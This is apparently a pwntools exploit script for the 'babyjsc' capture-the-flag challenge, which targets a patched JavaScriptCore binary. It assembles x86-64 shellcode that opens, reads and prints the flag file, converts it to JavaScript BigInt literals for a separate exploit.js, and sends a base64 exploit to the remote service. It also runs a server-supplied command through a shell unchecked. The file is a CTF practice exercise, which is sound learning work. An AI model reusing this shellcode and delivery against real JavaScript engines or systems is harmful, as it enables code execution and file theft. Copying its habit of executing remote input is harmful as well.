#!/usr/bin/env python3

from pwn import *
import subprocess, base64

elf = ELF("./jsc_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.REMOTE:
        r = remote("babyjsc.challs.olicyber.it", 38077)
        r.recvuntil(b'or\n')
        command = r.recvline().strip().decode()
        print(f"Received command: {command}")
        res = subprocess.run(command, shell=True, capture_output=True).stdout
        r.sendline(res)
        payload = open("exploit.js", "rb").read()
        r.sendlineafter(b'Send me your js exploit b64-encoded followed by a newline', base64.b64encode(payload))
        r.interactive()
    elif args.GDB:
        r = gdb.debug([elf.path, "exploit.js"], '''
                                continue
                      ''', env={"LD_LIBRARY_PATH": "./libs", "FLAG": "test_flag"})
    else:
        r = process([elf.path, "exploit.js"], env={"LD_LIBRARY_PATH": "./libs", "FLAG": "test_flag"})

    return r


def main():
    payload = asm(f"""
        /* open("/home/user/flag", O_RDONLY) */
        lea rdi, [rip + path]
        xor rsi, rsi
        mov rax, 2
        syscall

        /* read(fd, rsp, 0x1000) */
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x1000
        xor rax, rax
        syscall

        /* write(1, rsp, bytes_read) */
        mov rdx, rax
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        /* exitgroup(0) */
        xor rdi, rdi
        mov rax, 0xe7
        syscall

    path:
        .asciz "/home/user/flag"

    """)
    
    while len(payload) % 8:
        payload += b'\x90'

    # JS BigInt array syntax
    for i in range(0, len(payload), 8):
        val = u64(payload[i:i+8])
        print(f"    0x{val:016x}n,")
    
    r = conn()

    r.interactive()


if __name__ == "__main__":
    main()
